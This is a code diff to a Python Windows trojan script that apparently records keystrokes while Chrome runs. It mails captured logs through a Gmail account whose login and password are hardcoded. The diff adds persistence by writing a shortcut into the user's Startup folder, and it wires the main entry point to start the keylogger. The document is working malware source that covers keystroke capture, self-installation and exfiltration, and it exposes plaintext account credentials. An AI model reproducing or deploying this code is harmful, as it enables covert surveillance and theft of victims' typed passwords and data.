@@ -88,14 +88,17 @@ class KeyLogger(object):
 
     def stopkeylogger(self):
         # Let the keylogger run for seconds
-        time.sleep(100)
+        while not self.should_keylogger_stop:
+            time.sleep(50)
+            self.should_keylogger_stop = not self.isChromeRunning()
+            if self.should_keylogger_stop is True:
+                self.log_controller.writeMessage("Switched should_keylogger_stop flag to True\n")
+
         # log_message = "Posting message on thread ", str(self.running_keylogger_thread_id), "\n"
         # self.log_controller.writeMessage(log_message)
         # ctypes.windll.user32.PostQuitMessage(0)
         # win32api.PostThreadMessage(self.running_keylogger_thread_id, win32con.WM_QUIT, 0, 0)
         
-        self.should_keylogger_stop = True
-        self.log_controller.writeMessage("Switched should_keylogger_stop flag to True\n")
 
     def isChromeRunning(self):
         log_message = """Checked if Chrome was running\n"""
@@ -119,7 +122,7 @@ class Constants:
     USER_PATH = os.path.join(r"C:\Users", USER_NAME)
     SEARCH_ROOT = USER_PATH
     ROOT = r"C:"
-    LOG_FILE_LOCATION = os.path.join(USER_PATH,r"Desktop\trojan_log.txt")
+    LOG_FILE_LOCATION = os.path.join(USER_PATH, r"Desktop\trojan_log.txt")
     APPEND_MODE = 'a'
     OVERWRITE_MODE = 'w'
     READ_MODE = 'r'
@@ -138,8 +141,10 @@ class Constants:
     EMAIL_LOGIN = "trojanhorsepy@gmail.com"
     EMAIL_PASSWORD = "nattanshimon"
     STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-    PYTHON_DEFAULT_PATH = r"C:\Python34\python.exe"
     SELF_lOCATION = os.path.abspath(__file__)
+    PYTHON_DEFAULT_LOCATION = ""
+
+
 
 
 class OSmanipulation(object):
@@ -304,13 +309,13 @@ class AttachMail():
         self.mailServer.ehlo()
         self.mailServer.starttls()
         self.mailServer.ehlo()
-        self.mailServer.login(Constans.EMAIL_LOGIN ,Constans.EMAIL_PASSWORD)   
+        self.mailServer.login(Constants.EMAIL_LOGIN, Constants.EMAIL_PASSWORD)
     def stop_server(self):
         self.mailServer.close()
-    def sendMail(self,to,subject,text,attach):
+    def sendMail(self, to, subject, text, attach):
         msg = MIMEMultipart()
   
-        msg['From'] = Constans.EMAIL_LOGIN
+        msg['From'] = Constants.EMAIL_LOGIN
         msg['To'] = to
         msg['Subject'] = subject
       
@@ -325,19 +330,37 @@ class AttachMail():
         self.mailServer.sendmail(gmail_name, to, msg.as_string())
 
 
-def add_self_to_startup(self):
+def add_self_to_startup():
     # Check if program is in startup
     # If not, add it
-    if 'trojan.py' not in os.listdir(Constants.STARTUP_LOCATION):
+    log_controller = Log()
+
+    if 'test.lnk' not in os.listdir(Constants.STARTUP_LOCATION):
+        test_path = os.listdir(r"C:\\")
+        for x in range(36, 22, -1):
+            version = "Python" + str(x)
+            print(version)
+            if version in test_path:
+                Constants.PYTHON_DEFAULT_PATH = os.path.join(Constants.ROOT, "Python" + str(x))
+                Constants.PYTHON_DEFAULT_PATH = os.path.join(Constants.PYTHON_DEFAULT_PATH, "python.exe")
+                break
+
         ws = win32.Dispatch("wscript.shell")
-        scut = ws.CreateShortcut('test.lnk')
-        scut.Arguments = os.path.join(Constants.STARTUP_LOCATION, "trojan_horse.py")
+        scut = ws.CreateShortcut(Constants.STARTUP_LOCATION + r"\test.lnk")
         scut.TargetPath = Constants.PYTHON_DEFAULT_PATH
+        scut.Arguments = os.path.join("\"" + Constants.SELF_lOCATION, "trojan_horse.py" + "\"")
         scut.Save()
+        log_controller.writeMessage("Added shortcut to startup menu")
+    else:
+        log_controller.writeMessage("Shortcut ALREADY to startup menu")
+
+
 
 
 def kickOff():
 
+    # Make sure script is added to startup
+    add_self_to_startup()
     # Create the Keylogger object
     keylogger = KeyLogger()
 
@@ -358,6 +381,5 @@ def kickOff():
 #kickOff()
 if __name__ == "__main__":
     # call your code here
-    add_self_to_startup()
-    input()
+    kickOff()
 
